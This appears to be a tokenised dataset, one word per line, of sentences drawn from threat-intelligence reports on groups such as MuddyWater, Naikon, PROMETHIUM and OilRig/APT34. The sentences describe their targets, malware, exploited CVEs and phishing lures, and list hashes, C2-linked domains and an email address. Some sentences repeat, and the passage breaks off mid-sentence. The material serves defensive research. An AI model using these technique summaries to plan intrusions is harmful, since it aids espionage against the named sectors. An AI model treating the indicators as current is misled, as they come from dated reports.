intelligence
gathering
.
 
Most
targets
are
from
the
Middle
East
:
Israel
,
Egypt
,
Saudi
Arabia
,
United
Arab
Emirates
and
Iraq
.
 
The
United
States
and
countries
in
Europe
are
targeted
as
well
.
 
The
sample
analyzed
is
f589827c4cf94662544066b80bfda6ab
from
late
August
2015
.
 
The
MuddyWater
attacks
are
primarily
against
Middle
Eastern
nations
.
 
However
,
we
have
also
observed
attacks
against
surrounding
nations
and
beyond
,
including
targets
in
India
and
the
USA
.
 
Targeted
sectors
of
Molerats
include
governmental
and
diplomatic
institutions
,
including
embassies
;
companies
from
the
aerospace
and
defence
Industries
;
financial
institutions
;
journalists
;
software
developers
.
 
The
Palo
Alto
Networks
Unit
42
research
team
recently
came
across
a
series
of
malicious
files
which
were
almost
identical
to
those
targeting
the
Saudi
Arabian
government
previously
discussed
by
MalwareBytes
.
 
MuddyWater
attacks
are
characterized
by
the
use
of
a
slowly
evolving
PowerShell-based
first
stage
backdoor
we
call
"
POWERSTATS
"
.
 
When
we
looked
at
the
cluster
of
activity
which
consisted
of
what
appeared
to
be
espionage-focused
attacks
in
the
Middle
East
,
we
were
somewhat
confused
as
the
previous
public
reporting
had
attributed
these
attacks
to
FIN7
.
 
FIN7
is
a
threat
actor
group
that
is
financially
motivated
with
targets
in
the
restaurant
,
services
and
financial
sectors
.
 
Following
the
trail
of
existing
public
reporting
,
the
tie
to
FIN7
is
essentially
made
based
on
a
download
observed
from
a
MuddyWater
C2
,
of
a
non-public
tool
"
DNSMessenger
"
.
 
There
was
a
mistake
in
the
original
Morphisec
analysis
which
linked
these
attacks
to
FIN7
.
 
The
DNSMessenger
malware
is
a
shared
tool
,
used
by
FIN7
,
MuddyWater
and
perhaps
other
groups
.
 
In
September
2018
,
we
found
evidence
of
Seedworm
and
the
espionage
group
APT28
(
aka
Swallowtail
,
Fancy
Bear
)
,
on
a
computer
within
the
Brazil-based
embassy
of
an
oil-producing
nation
.
 
We
found
new
variants
of
the
Powermud
backdoor
,
a
new
backdoor
(
Backdoor.Powemuddy
)
,
and
custom
tools
for
stealing
passwords
,
creating
reverse
shells
,
privilege
escalation
,
and
the
use
of
the
native
Windows
cabinet
creation
tool
,
makecab.exe
,
probably
for
compressing
stolen
data
to
be
uploaded
.
 
Seedworm
likely
functions
as
a
cyber
espionage
group
to
secure
actionable
intelligence
that
could
benefit
their
sponsor
's
interests
.
 
During
the
operations
,
the
group
used
tools
consistent
with
those
leveraged
during
past
intrusions
including
Powermud
,
a
custom
tool
used
by
the
Seedworm
group
,
and
customized
PowerShell
,
LaZagne
,
and
Crackmapexec
scripts
.
 
The
Seedworm
group
controls
its
Powermud
backdoor
from
behind
a
proxy
network
to
hide
the
ultimate
command-and-control
(
C&C
)
location
.
 
After
compromising
a
system
,
typically
by
installing
Powermud
or
Powemuddy
,
Seedworm
first
runs
a
tool
that
steals
passwords
saved
in
users
'
web
browsers
and
email
,
demonstrating
that
access
to
the
victim
's
email
,
social
media
,
and
chat
accounts
is
one
of
their
likely
goals
.
 
Seedworm
then
uses
open-source
tools
such
as
LaZagne
and
Crackmapexec
to
obtain
Windows
authorization
credentials
.
 
The
group
,
which
we
call
Seedworm
(
aka
MuddyWater
)
,
has
been
operating
since
at
least
2017
,
with
its
most
recent
activity
observed
in
December
2018
.
 
The
Seedworm
group
is
the
only
group
known
to
use
the
Powermud
backdoor
.
 
Additionally
,
the
group
compromised
organizations
in
Europe
and
North
America
that
have
ties
to
the
Middle
East
.
 
MuddyWater
is
an
Iranian
high-profile
threat
actor
that
's
been
seen
active
since
2017
.
 
Little
detail
is
given
on
the
nature
of
how
the
connection
between
DNSMessenger
and
MuddyWater
was
discovered
it
isn't
possible
for
us
to
verify
this
link
.
 
Over
the
past
year
,
we've
seen
the
group
extensively
targeting
a
wide
gamut
of
entities
in
various
sectors
,
including
Governments
,
Academy
,
Crypto-Currency
,
Telecommunications
and
the
Oil
sectors
.
 
Little
detail
is
given
on
the
nature
of
how
the
connection
between
DNSMessenger
and
MuddyWater
was
discovered
it
isn't
possible
for
us
to
verify
this
link
.
 
Depending
on
each
sample
,
the
content
of
document
is
either
a
fake
resume
application
,
or
a
letter
from
the
Ministry
of
Justice
in
Lebanon
or
Saudi
Arabia
.
 
Analysts
in
our
DeepSight
Managed
Adversary
and
Threat
Intelligence
(
MATI
)
team
have
found
a
new
backdoor
,
Backdoor.Powemuddy
,
new
variants
of
Seedworm
's
Powermud
backdoor
(
aka
POWERSTATS
)
,
a
GitHub
repository
used
by
the
group
to
store
their
scripts
,
as
well
as
several
post-compromise
tools
the
group
uses
to
exploit
victims
once
they
have
established
a
foothold
in
their
network
.
 
From
January
2018
to
March
2018
,
through
FireEye
's
Dynamic
Threat
Intelligence
,
we
observed
attackers
leveraging
the
latest
code
execution
and
persistence
techniques
to
distribute
malicious
macro-based
documents
to
individuals
in
Asia
and
the
Middle
East
.
 
MuddyWater
has
engaged
in
prolific
spear
phishing
of
government
and
defense
entities
in
Central
and
Southwest
Asia
.
 
This
actor
has
engaged
in
prolific
spear
phishing
of
government
and
defense
entities
in
Central
and
Southwest
Asia
.
 
When
successfully
executed
,
the
malicious
documents
install
a
backdoor
we
track
as
POWERSTATS
.
 
The
group
is
known
for
espionage
campaigns
in
the
Middle
East
.
 
The
threat
group
in
this
recently
observed
campaign
TEMP.Zagros
weaponized
their
malware
using
the
following
techniques
.
 
The
MuddyWater
campaign
was
first
sighted
in
2017
when
it
targeted
the
Saudi
government
using
an
attack
involving
PowerShell
scripts
deployed
via
Microsoft
Office
Word
macro
.
 
The
threat
group
in
this
recently
observed
campaign
a
TEMP.Zagros
a
weaponized
their
malware
using
the
following
techniques
.
 
Like
the
previous
campaigns
,
these
samples
again
involve
a
Microsoft
Word
document
embedded
with
a
malicious
macro
that
is
capable
of
executing
PowerShell
(
PS
)
scripts
leading
to
a
backdoor
payload
.
 
MuddyWater
is
a
relatively
new
APT
that
surfaced
in
2017
.
 
We
attribute
this
activity
to
TEMP.Zagros
(
reported
by
Palo
Alto
Networks
and
Trend
Micro
as
MuddyWater
)
,
an
Iran-nexus
actor
that
has
been
active
since
at
least
May
2017
.
 
We
attribute
this
activity
to
TEMP.Zagros
(
reported
by
Palo
Alto
Networks
and
Trend
Micro
)
,
an
Iran-nexus
actor
that
has
been
active
since
at
least
May
2017
.
 
Entities
in
these
sectors
are
often
"
enabling
victims
"
as
telecommunications
providers
or
IT
services
agencies
and
vendors
could
provide
Seedworm
actors
with
further
victims
to
compromise
.
 
The
group
mainly
targets
the
telecommunications
and
IT
services
sectors
.
 
However
,
the
group
behind
MuddyWater
has
been
known
to
target
other
countries
in
the
Middle
East
,
Europe
and
the
US
.
 
The
group
has
focused
mainly
on
governmental
targets
in
Iraq
and
Saudi
Arabia
,
according
to
past
telemetry
.
 
The
new
spear-phishing
docs
used
by
MuddyWater
rely
on
social
engineering
to
persuade
users
to
enable
macros
.
 
MuddyWater
has
recently
been
targeting
victims
likely
from
Lebanon
and
Oman
,
while
leveraging
compromised
domains
,
one
of
which
is
owned
by
an
Israeli
web
developer
.
 
As
MuddyWater
has
consistently
been
using
POWERSTATS
as
its
main
tool
,
they
are
relatively
easy
to
distinguish
from
other
actors
.
 
In
March
2018
,
Trend
Micro
provided
a
detailed
analysis
of
another
campaign
that
bore
the
hallmarks
of
MuddyWater
.
 
In
May
2018
,
Trend
Micro
found
a
new
sample
(
Detected
as
W2KM_DLOADR.UHAOEEN
)
that
may
be
related
to
this
campaign
.
 
In
May
2018
,
Trend
Micro
found
a
new
sample
(
Detected
as
W2KM_DLOADR.UHAOEEN
)
that
may
be
related
to
this
campaign
.
 
Given
the
use
of
lure
documents
designed
with
social
engineering
in
mind
,
it
is
likely
that
MuddyWater
use
phishing
or
spam
to
target
users
who
are
unaware
of
these
documents
'
malicious
nature
.
 
We
recently
noticed
the
group
behind
MuddyWater
that
appear
to
be
targeting
government
bodies
,
military
entities
,
telcos
and
educational
institutions
in
Jordan
,
Turkey
,
Azerbaijan
and
Pakistan
,
in
addition
to
the
continuous
targeting
of
Iraq
and
Saudi
Arabia
,
other
victims
were
also
detected
in
Mali
,
Austria
,
Russia
,
Iran
and
Bahrain.
.
 
Observed
Seedworm
victims
were
located
primarily
in
Pakistan
and
Turkey
,
but
also
in
Russia
,
Saudi
Arabia
,
Afghanistan
,
Jordan
,
and
elsewhere
.
 
The
MuddyWaters
group
has
carried
out
a
large
number
of
attacks
and
demonstrated
advanced
social
engineering
,
in
addition
to
the
active
development
of
attacks
,
infrastructure
and
the
use
of
new
methods
and
techniques
.
 
Cisco
Talos
assesses
with
moderate
confidence
that
a
campaign
we
recently
discovered
called
"
BlackWater
"
is
associated
with
suspected
persistent
threat
actor
MuddyWater
.
 
In
this
latest
activity
,
BlackWater
first
added
an
obfuscated
Visual
Basic
for
Applications
(
VBA
)
script
to
establish
persistence
as
a
registry
key
.
 
Talos
has
uncovered
documents
that
we
assess
with
moderate
confidence
are
associated
with
suspected
persistent
threat
actor
MuddyWater
.
 
MuddyWater
has
been
active
since
at
least
November
2017
and
has
been
known
to
primarily
target
entities
in
the
Middle
East
.
 
Between
February
and
March
2019
,
probable
MuddyWater-associated
samples
indicated
that
BlackWater
established
persistence
on
the
compromised
host
,
at
used
PowerShell
commands
to
enumerate
the
victim
's
machine
and
contained
the
IP
address
of
the
actor
's
command
and
control
(
C2
)
.
 
Despite
last
month
's
report
on
aspects
of
the
MuddyWater
campaign
,
the
group
is
undeterred
and
continues
to
perform
operations
.
 
Based
on
these
observations
,
as
well
as
MuddyWater
's
history
of
targeting
Turkey-based
entities
,
we
assess
with
moderate
confidence
that
this
campaign
is
associated
with
the
MuddyWater
threat
actor
group
.
 
Our
recent
report
,
"
The
Chronicles
of
the
Hellsing
APT
:
the
Empire
Strikes
Back
"
began
with
an
introduction
to
the
Naikon
APT
,
describing
it
as
"
One
of
the
most
active
APTs
in
Asia
,
especially
around
the
South
China
Sea
"
.
 
It
came
in
the
form
of
a
"
Tran
Duy
Linh
"
CVE-2012-0158
exploit
kit
document
MD5
:
de8a242af3794a8be921df0cfa51885f61
and
was
observed
on
April
10
,
2014
.
 
Considering
the
volume
of
Naikon
activity
observed
and
its
relentless
,
repeated
attack
attempts
,
such
a
confrontation
was
worth
looking
into
,
so
we
did
.
 
The
attackers
appeared
to
be
Chinese-speaking
and
targeted
mainly
top-level
government
agencies
and
civil
and
military
organizations
in
countries
such
as
the
Philippines
,
Malaysia
,
Cambodia
,
Indonesia
,
Vietnam
,
Myanmar
,
Singapore
,
Nepal
,
Thailand
,
Laos
and
China
.
 
The
oil
and
gas
infrastructure
nexus
observed
in
connection
with
greensky27.vicp.net
and
other
Unit
78020
(
Naikon
)
infrastructure
suggests
targeting
patterns
supportive
of
the
PRC
's
strategic
interests
over
energy
resources
within
the
South
China
Sea
and
Southeast
Asia
.
 
This
Naikon
report
will
be
complemented
by
a
follow-on
report
that
will
examine
the
Naikon
TTP
and
the
incredible
volume
of
attack
activity
around
the
South
China
Sea
that
has
been
going
on
since
at
least
2010
.
 
The
attackers
appeared
to
be
Chinese-speaking
and
targeted
mainly
top-level
government
agencies
and
civil
and
military
organizations
in
countries
such
as
the
Philippines
,
Malaysia
,
Cambodia
,
Indonesia
,
Vietnam
,
Myanmar
,
Singapore
,
Nepal
.
 
This
bait
document
,
or
email
attachment
,
appears
to
be
a
standard
Word
document
,
but
is
in
fact
an
CVE-2012-0158
exploit
,
an
executable
with
a
double
extension
,
or
an
executable
with
an
RTLO
filename
,
so
it
can
execute
code
without
the
user
's
knowledge
or
consent
.
 
In
the
Naikon
scheme
,
a
C&C
server
can
be
specialized
XSControl
software
running
on
the
host
machine
.
 
It
was
during
operator
X
's
network
monitoring
that
the
attackers
placed
Naikon
proxies
within
the
countries
'
borders
,
to
cloak
and
support
real-time
outbound
connections
and
data
Exfiltration
from
high-profile
victim
organizations
.
 
In
addition
to
stealing
keystrokes
,
Naikon
also
intercepted
network
traffic
.
 
Operator
X
also
took
advantage
of
cultural
idiosyncrasies
in
its
target
countries
,
for
example
,
the
regular
and
widely
accepted
use
of
personal
Gmail
accounts
for
work
.
 
In
the
spring
of
2014
,
we
noticed
an
increase
in
the
volume
of
attack
activity
by
the
Naikon
APT
.
 
In
particular
,
we
noticed
that
the
Naikon
group
was
spear-phished
by
an
actor
we
now
call
"
Hellsing
"
.
 
More
details
about
the
cloak
and
dagger
games
between
Naikon
and
Hellsing
can
be
found
in
our
blogpost
:
"
The
Chronicles
of
the
Hellsing
APT
:
The
Empire
Strikes
Back
"
.
 
Truvasys
has
been
involved
in
several
attack
campaigns
,
where
it
has
masqueraded
as
one
of
server
common
computer
utilities
,
including
WinUtils
,
TrueCrypt
,
WinRAR
,
or
SanDisk
.
 
PROMETHIUM
is
an
activity
group
that
has
been
active
as
early
as
2012
.
 
The
group
primarily
uses
Truvasys
,
a
first-stage
malware
that
has
been
in
circulation
for
several
years
.
 
NEODYMIUM
is
an
activity
group
that
is
known
to
use
a
backdoor
malware
detected
by
Microsoft
as
Wingbird
.
 
PROMETHIUM
and
NEODYMIUM
both
used
an
exploit
for
CVE-2016-4117
,
a
vulnerability
in
Adobe
Flash
Player
that
,
at
the
time
,
was
both
unknown
and
unpatched
.
 
Data
about
Wingbird
activity
indicate
that
it
is
typically
used
to
attack
individual
computers
instead
of
networks
.
 
In
early
May
2016
,
both
PROMETHIUM
and
NEODYMIUM
started
conducting
attack
campaigns
against
specific
individuals
in
Europe
.
 
Meanwhile
,
NEODYMIUM
used
well-tailored
spear-phishing
emails
with
attachments
that
delivered
the
exploit
code
,
ultimately
leading
to
Wingbird
's
installation
on
victim
computers
.
 
PROMETHIUM
and
NEODYMIUM
both
used
a
zero-day
exploit
that
executed
code
to
download
a
malicious
payload
.
 
Wingbird
,
the
advanced
malware
used
by
NEODYMIUM
,
has
several
behaviors
that
trigger
alerts
in
Windows
Defender
ATP
.
 
This
volume
chronicles
two
activity
groups
,
code-named
PROMETHIUM
and
NEODYMIUM
,
both
of
which
target
individuals
in
a
specific
LOC
of
Europe
.
 
Although
most
malware
today
either
seeks
monetary
gain
or
conducts
espionage
for
economic
advantage
,
both
of
these
activity
groups
appear
to
seek
information
about
specific
individuals
.
 
In
May
2016
,
both
PROMETHIUM
and
NEODYMIUM
were
observed
to
launch
attack
campaigns
.
 
NEODYMIUM
is
an
activity
group
that
,
like
PROMETHIUM
,
conducted
an
attack
campaign
in
early
May
2016
.
 
Data
about
Wingbird
activity
indicates
that
it
is
typically
used
to
attack
individuals
and
individual
computers
instead
of
networks
.
 
NEODYMIUM
also
used
the
exact
same
CVE-2016-4117
exploit
code
that
PROMETHIUM
used
,
prior
to
public
knowledge
of
the
vulnerability
's
existence
.
 
NEODYMIUM
used
a
backdoor
detected
by
Windows
Defender
as
Wingbird
,
whose
characteristics
closely
match
FinFisher
,
a
government-grade
commercial
surveillance
package
.
 
In
May
2016
,
two
apparently
unrelated
activity
groups
,
PROMETHIUM
and
NEODYMIUM
,
conducted
attack
campaigns
in
Europe
that
used
the
same
zeroday
exploit
while
the
vulnerability
was
publicly
unknown
.
 
The
Middle
Eastern
hacker
group
in
this
case
is
codenamed
"
BlackOasis
"
Kaspersky
found
the
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
"
FinSpy
"
malware
,
according
to
a
new
blog
post
published
Monday
.
 
FinSpy
,
a
final-stage
payload
that
allows
for
an
attacker
to
covertly
learn
what
a
target
is
talking
about
and
who
they
are
communicating
with
,
is
associated
with
Gamma
Group
which
goes
by
other
names
,
including
FinFisher
and
Lench
IT
Solutions
.
 
In
the
past
,
BlackOasis
messages
were
designed
to
appear
like
news
articles
from
2016
about
political
relations
between
Angola
and
China
.
 
BlackOasis
in
recent
months
sent
a
wave
of
phishing
emails
.
 
PROMETHIUM
uses
a
unique
set
of
tools
and
methods
to
perform
actions
like
lateral
movement
and
data
Exfiltration
.
 
Last
year
,
Microsoft
researchers
described
Neodymium
's
behavior
as
unusual
:
"
unlike
many
activity
groups
,
which
typically
gather
information
for
monetary
gain
or
economic
espionage
,
PROMETHIUM
and
NEODYMIUM
appear
to
launch
campaigns
simply
to
gather
information
about
certain
individuals
.
 
The
discovery
by
Kaspersky
marks
at
least
the
fifth
zero-day
exploit
used
by
BlackOasis
and
exposed
by
security
researchers
since
June
2015
.
 
Victims
of
BlackOasis
have
been
observed
in
the
following
countries
:
Russia
,
Iraq
,
Afghanistan
,
Nigeria
,
Libya
,
Jordan
,
Tunisia
,
Saudi
Arabia
,
Iran
,
Netherlands
,
Bahrain
,
United
Kingdom
and
Angola
.
 
Unlike
many
activity
groups
,
which
typically
gather
information
for
monetary
gain
or
economic
espionage
,
PROMETHIUM
and
NEODYMIUM
appear
to
launch
campaigns
simply
to
gather
information
about
certain
individuals
.
 
A
cursory
review
of
BlackOasis
'
espionage
campaign
suggests
there
is
some
overlap
between
the
group
's
actions
and
Saudi
Arabia
's
geopolitical
interests
.
 
Kaspersky
's
research
notes
that
BlackOasis
hacked
into
computers
based
in
Saudi
Arabia
.
 
All
13
countries
where
Kaspersky
reportedly
observed
BlackOasis
activity
are
connected
to
Saudi
Arabia
in
one
of
three
ACTs
:
economically
;
from
a
national
security
perspective
;
or
due
to
established
policy
agreements
.
 
The
Operation
Aurora
,
named
by
McAfee
and
announced
in
January
2010
,
and
the
WikiLeaks
document
disclosures
of
2010
have
highlighted
the
fact
that
external
and
internal
threats
are
nearly
impossible
to
prevent
.
 
These
attacks
have
involved
social
engineering
,
spearphishing
attacks
,
exploitation
of
Microsoft
Windows
operating
systems
vulnerabilities
,
Microsoft
Active
Directory
compromises
,
and
the
use
of
remote
administration
tools
(
RATs
)
in
targeting
and
harvesting
sensitive
competitive
proprietary
operations
and
project-financing
information
with
regard
to
oil
and
gas
field
bids
and
operations
.
 
Night
Dragon
's
attacks
have
involved
social
engineering
,
spearphishing
attacks
,
exploitation
of
Microsoft
Windows
operating
systems
vulnerabilities
,
Microsoft
Active
Directory
compromises
,
and
the
use
of
remote
administration
tools
(
RATs
)
in
targeting
and
harvesting
sensitive
competitive
proprietary
operations
and
project-financing
information
with
regard
to
oil
and
gas
field
bids
and
operations
.
 
We
have
identified
the
tools
,
techniques
,
and
network
activities
used
in
these
continuing
attackswhich
we
have
dubbed
Night
Dragonas
originating
primarily
in
China
.
 
Attackers
using
several
locations
in
China
have
leveraged
C&C
servers
on
purchased
hosted
services
in
the
United
States
and
compromised
servers
in
the
Netherlands
to
wage
attacks
against
global
oil
,
gas
,
and
petrochemical
companies
,
as
well
as
individuals
and
executives
in
Kazakhstan
,
Taiwan
,
Greece
,
and
the
United
States
to
acquire
proprietary
and
highly
confidential
information
.
 
Attackers
using
several
locations
in
China
have
leveraged
C&C
servers
on
purchased
hosted
services
in
the
United
States
and
compromised
servers
in
the
Netherlands
to
wage
attacks
against
global
oil
,
gas
,
and
petrochemical
companies
,
as
well
as
individuals
and
executives
in
Kazakhstan
,
Taiwan
,
Greece
,
and
the
United
States
to
acquire
proprietary
and
highly
confidential
information
.
 
The
primary
operational
technique
used
by
Night
Dragon
comprised
a
variety
of
hacker
tools
,
including
privately
developed
and
customized
RAT
tools
that
provided
complete
remote
administration
capabilities
to
the
attacker
.
 
While
Night
Dragon
attacks
focused
specifically
on
the
energy
sector
,
the
tools
and
techniques
of
this
kind
can
be
highly
successful
when
targeting
any
industry
.
 
In
addition
,
the
attackers
employed
hacking
tools
of
Chinese
origin
and
that
are
prevalent
on
Chinese
underground
hacking
forums
.
 
We
have
been
presented
with
a
rare
opportunity
to
see
some
development
activities
from
the
actors
associated
with
the
OilRig
attack
campaign
,
a
campaign
Unit
42
has
been
following
since
May
2016
.
 
Recently
we
were
able
to
observe
these
actors
making
modifications
to
their
Clayslide
delivery
documents
in
an
attempt
to
evade
antivirus
detection
.
 
We
collected
two
sets
of
Clayslide
samples
that
appear
to
be
created
during
the
OilRig
actor
's
development
phase
of
their
attack
lifecycle
.
 
On
November
15
,
2016
,
an
actor
related
to
the
OilRig
campaign
began
testing
the
Clayslide
delivery
documents
.
 
The
actor
then
made
subtle
modifications
to
the
file
and
uploaded
the
newly
created
file
to
the
same
popular
antivirus
testing
website
in
order
to
determine
how
to
evade
detection
.
 
In
addition
to
making
changes
to
the
Excel
worksheets
that
contain
the
decoy
content
,
the
actor
also
made
changes
to
the
worksheet
that
is
initially
displayed
to
the
user
.
 
Taking
a
step
back
,
as
discussed
in
the
Appendix
in
our
initial
OilRig
blog
,
Clayslide
delivery
documents
initially
open
with
a
worksheet
named
"
Incompatible
"
that
displays
content
that
instructs
the
user
to
"
Enable
Content
"
to
see
the
contents
of
the
document
,
which
in
fact
runs
the
malicious
macro
and
compromises
the
system
.
 
This
realization
suggests
that
the
OilRig
threat
group
will
continue
to
use
their
delivery
documents
for
extended
periods
with
subtle
modifications
to
remain
effective
.
 
Iranian
threat
agent
OilRig
has
been
targeting
multiple
organisations
in
Israel
and
other
countries
in
the
Middle
East
since
the
end
of
2015
.
 
In
recent
attacks
they
set
up
a
fake
VPN
Web
Portal
and
targeted
at
least
five
Israeli
IT
vendors
,
several
financial
institutes
,
and
the
Israeli
Post
Office
.
 
In
these
websites
they
hosted
malware
that
was
digitally
signed
with
a
valid
,
likely
stolen
code
signing
certificate
.
 
In
December
2015
,
Symantec
published
a
post
about
"
two
Iran-based
attack
groups
that
appear
to
be
connected
,
Cadelle
and
Chafer
"
that
"
have
been
using
Backdoor.Cadelspy
and
Backdoor.Remexi
to
spy
on
Iranian
individuals
and
Middle
Eastern
organizations
"
.
 
In
May
2016
,
Unit
42
observed
attacks
of
OilRig
primarily
focused
on
financial
institutions
and
technology
organizations
within
Saudi
Arabia
.
 
In
recent
OilRig
attacks
,
the
threat
actors
purport
to
be
legitimate
service
providers
offering
service
and
technical
troubleshooting
as
a
social
engineering
theme
in
their
spear-phishing
attacks
.
 
The
campaign
appears
highly
targeted
and
delivers
a
backdoor
we
have
called
'
Helminth
'
.
 
Artifacts
identified
within
the
malware
samples
related
to
these
attacks
also
suggest
the
targeting
of
the
defense
industry
in
Saudi
Arabia
,
which
appears
to
be
related
to
an
earlier
wave
of
attacks
carried
out
in
the
fall
of
2015
.
 
In
May
2016
,
Unit
42
began
researching
attacks
that
used
spear-phishing
emails
with
attachments
,
specifically
malicious
Excel
spreadsheets
sent
to
financial
organizations
within
Saudi
Arabia
.
 
Over
the
course
of
the
attack
campaign
,
we
have
observed
two
different
variations
of
the
Helminth
backdoor
,
one
written
in
VBScript
and
PowerShell
that
was
delivered
via
a
macro
within
Excel
spreadsheets
and
the
other
a
standalone
Windows
executable
.
 
FireEye
also
reported
on
these
attacks
in
a
May
22
blog
post
.
 
The
executable
variant
of
Helminth
is
installed
with
a
dropper
Trojan
that
we
are
tracking
as
the
HerHer
Trojan
.
 
The
Helminth
executable
variant
is
very
similar
in
functionality
to
its
script-based
counterpart
,
as
it
also
communicates
with
its
C2
server
using
both
HTTP
and
DNS
queries
.
 
Helminth
executable
samples
send
artifacts
within
network
beacons
to
its
C2
server
that
the
Trojan
refers
to
as
a
'
Group
'
and
'
Name
'
.
 
It
appears
that
the
group
values
hardcoded
into
the
malware
is
associated
with
the
targeted
organization
,
as
several
are
Saudi
Arabian
organizations
within
the
telecommunications
and
defense
industries
.
 
It
appears
that
the
group
values
hardcoded
into
the
malware
is
associated
with
the
targeted
organization
,
as
several
are
Saudi
Arabian
organizations
within
the
telecommunications
and
defense
industries
.
 
This
suggests
that
the
threat
actors
are
not
only
focused
on
financial
organizations
,
as
their
target
set
could
include
other
industries
as
well
.
 
The
email
address
edmundj@chmail.ir
and
the
geolocation
of
Tehran
,
Iran
,
being
of
note
.
 
The
registrant
information
for
kernel.ws
also
provided
a
geolocation
of
Tehran
,
IR
and
the
email
provider
for
the
address
used
in
checkgoogle.org
was
the
same
used
for
mydomain1607.com
,
chmail.ir
.
 
The
mydomain1110.com
domain
did
not
appear
to
reuse
any
of
the
previously
observed
WHOIS
data
artifacts
,
but
did
still
give
a
geolocation
of
Tehran
in
addition
to
the
use
of
an
email
address
linked
to
other
domains
thematically
similar
to
the
know
command
and
control
domains
and
are
potentially
related
.
 
While
researching
the
OilRig
campaign
,
we
have
seen
two
waves
of
targeted
attacks
on
Saudi
Arabian
organizations
in
which
a
group
of
threat
actors
delivered
the
Helminth
Trojan
as
a
payload
.
 
The
two
variants
of
Helminth
do
require
different
delivery
methods
,
with
the
script
variant
relying
on
an
Excel
spreadsheet
for
delivery
,
while
the
executable
variant
is
more
traditional
in
the
fact
that
it
can
be
installed
without
a
delivery
document
.
 
Since
our
first
published
analysis
of
the
OilRig
campaign
in
May
2016
,
we
have
continued
to
monitor
this
group
for
new
activity
.
 
Additionally
,
the
scope
of
organizations
targeted
by
this
group
has
expanded
to
not
only
include
organizations
within
Saudi
Arabia
,
but
also
a
company
in
Qatar
and
government
organizations
in
Turkey
,
Israel
and
the
United
States
.
 
The
group
behind
the
OilRig
campaign
continues
to
leverage
spear-phishing
emails
with
malicious
Microsoft
Excel
documents
to
compromise
victims
.
 
In
addition
to
these
instances
,
multiple
Qatari
organizations
were
the
subject
to
spear
phishing
attacks
carrying
Helminth
samples
earlier
this
year
.
 
While
the
malware
deployed
is
not
terribly
sophisticated
,
it
uses
techniques
such
as
DNS
command
and
control
(
C2
)
that
allows
it
to
stay
under
the
radar
at
many
establishments
.
 
Less
than
a
week
after
Microsoft
issued
a
patch
for
CVE-2017-11882
on
Nov.
14
,
2017
,
FireEye
observed
an
attacker
using
an
exploit
for
the
Microsoft
Office
vulnerability
to
target
a
government
organization
in
the
Middle
East
.
 
We
assess
this
activity
was
carried
out
by
a
suspected
Iranian
cyber
espionage
threat
group
,
whom
we
refer
to
as
APT34
,
using
a
custom
PowerShell
backdoor
to
achieve
its
objectives
.
 
This
threat
group
has
conducted
broad
targeting
across
a
variety
of
industries
,
including
financial
,
government
,
energy
,
chemical
,
and
telecommunications
,
and
has
largely
focused
its
operations
within
the
Middle
East
.
 
We
assess
that
APT34
works
on
behalf
of
the
Iranian
government
based
on
infrastructure
details
that
contain
references
to
Iran
,
use
of
Iranian
infrastructure
,
and
targeting
that
aligns
with
nation-state
interests
.
 
APT34
uses
a
mix
of
public
and
non-public
tools
,
often
conducting
spear
phishing
operations
using
compromised
accounts
,
sometimes
coupled
with
social
engineering
tactics
.
 
We
believe
APT34
is
involved
in
a
long-term
Cyber
Espionage
operation
largely
focused
on
reconnaissance
efforts
to
benefit
Iranian
nation-state
interests
and
has
been
operational
since
at
least
2014
.
 
In
May
2016
,
we
published
a
blog
detailing
a
spear
phishing
campaign
targeting
banks
in
the
Middle
East
region
that
used
macro-enabled
attachments
to
distribute
POWBAT
malware
.
 
In
July
2017
,
we
observed
APT34
targeting
a
Middle
East
organization
using
a
PowerShell-based
backdoor
that
we
call
POWRUNER
and
a
downloader
with
domain
generation
algorithm
functionality
that
we
call
BONDUPDATER
,
based
on
strings
within
the
malware
.
 
APT34
loosely
aligns
with
public
reporting
related
to
the
group
"
OilRig
"
.
 
The
backdoor
was
delivered
via
a
malicious
.rtf
file
that
exploited
CVE-2017-0199
.
 
In
this
latest
campaign
,
APT34
leveraged
the
recent
Microsoft
Office
vulnerability
CVE-2017-11882
to
deploy
POWRUNER
and
BONDUPDATER
.
 
The
vulnerability
was
patched
by
Microsoft
on
Nov
14
,
2017
.
 
The
vulnerability
exists
in
the
old
Equation
Editor
(
EQNEDT32.EXE
)
,
a
component
of
Microsoft
Office
that
is
used
to
insert
and
evaluate
mathematical
formulas
.
 
During
the
past
few
months
,
APT34
has
been
able
to
quickly
incorporate
exploits
for
at
least
two
publicly
vulnerabilities
(
CVE-2017-0199
and
CVE-2017-11882
)
to
target
organizations
in
the
Middle
East
.
 
The
OilRig
group
(
AKA
APT34
,
Helix
Kitten
)
is
an
adversary
motivated
by
espionage
primarily
operating
in
the
Middle
East
region
.
 
We
expect
APT34
will
continue
to
evolve
their
malware
and
tactics
as
they
continue
to
pursue
access
to
entities
in
the
Middle
East
region
.
 
The
OilRig
group
(
AKA
APT34
,
Helix
Kitten
)
is
an
adversary
motivated
by
espionage
primarily
operating
in
the
Middle
East
region
.
 
We
first
discovered
this
group
in
mid-2016
,
although
it
is
possible
their
operations
extends
earlier
than
that
time
frame
.
 
Between
May
and
June
2018
,
Unit
42
observed
multiple
attacks
by
the
OilRig
group
appearing
to
originate
from
a
government
agency
in
the
Middle
East
.
 
The
use
of
script-based
backdoors
is
a
common
technique
used
by
the
OilRig
group
as
we
have
previously
documented
.
 
The
attacks
delivered
a
PowerShell
backdoor
called
QUADAGENT
,
a
tool
attributed
to
the
OilRig
group
by
both
ClearSky
Cyber
Security
and
FireEye
.
 
A
closer
examination
revealed
the
obfuscation
used
by
the
OilRig
group
in
these
QUADAGENT
samples
were
likely
the
result
of
using
an
open-source
toolkit
called
Invoke-Obfuscation
.
 
All
three
waves
involved
a
single
spear
phishing
email
that
appeared
to
originate
from
a
government
agency
based
in
the
Middle
East
.
 
This
latest
attack
consisted
of
three
waves
between
May
and
June
2018
.
 
The
OilRig
group
continues
to
be
a
persistent
adversary
group
in
the
Middle
East
region
.
 
APT34
are
involved
in
long-term
cyber
espionage
operations
largely
focused
on
the
Middle
East
.
 
This
threat
group
has
conducted
broad
targeting
across
a
variety
of
industries
,
including
financial
,
government
,
energy
,
chemical
,
and
telecommunications
.
 
Recent
investigations
by
FireEye
's
Mandiant
incident
response
consultants
combined
with
FireEye
iSIGHT
Threat
Intelligence
analysis
have
given
us
a
more
complete
picture
of
a
suspected
Iranian
threat
group
,
that
we
believe
has
been
operating
since
at
least
2014
.
 
Join
us
in
a
live
webinar
as
we
